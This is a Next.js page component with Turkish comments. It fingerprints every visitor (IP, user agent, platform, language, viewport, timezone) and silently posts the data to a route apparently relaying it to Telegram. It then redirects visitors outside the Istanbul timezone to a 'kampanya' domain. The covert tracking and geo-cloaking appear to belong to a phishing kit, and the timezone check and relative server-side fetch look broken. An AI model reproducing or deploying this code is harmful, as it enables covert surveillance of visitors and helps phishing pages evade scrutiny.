import { headers } from 'next/headers';
import { redirect } from 'next/navigation';

export default async function Home() {
  const headersList = await headers();
  const userAgent = headersList.get('user-agent') || 'Unknown';
  const ip = headersList.get('x-forwarded-for') || 'Unknown';
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const isTurkishTimezone = timezone === 'Europe/Istanbul';
  const platform = headersList.get('sec-ch-ua-platform') || 'Unknown';
  const language = headersList.get('accept-language') || 'Unknown';
  const screenResolution = headersList.get('sec-ch-viewport-width') 
    ? `${headersList.get('sec-ch-viewport-width')}x${headersList.get('sec-ch-viewport-height')}`
    : 'Unknown';

  // Telegram bildirimi gönder
  try {
    await fetch('/api/telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ip,
        userAgent,
        timezone,
        isTurkishTimezone,
        platform,
        language,
        screenResolution
      })
    });
  } catch (error) {
    console.error('Telegram notification error:', error);
  }

  // Türkiye dışındaki kullanıcıları yönlendir
  if (!isTurkishTimezone) {
    redirect('https://bbnsbnkampanya.vercel.app/');
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-24">
      <h1 className="text-4xl font-bold mb-8">Hoş Geldiniz</h1>
      <p className="text-xl">Bu site sadece Türkiye'den erişilebilir.</p>
    </main>
  );
}
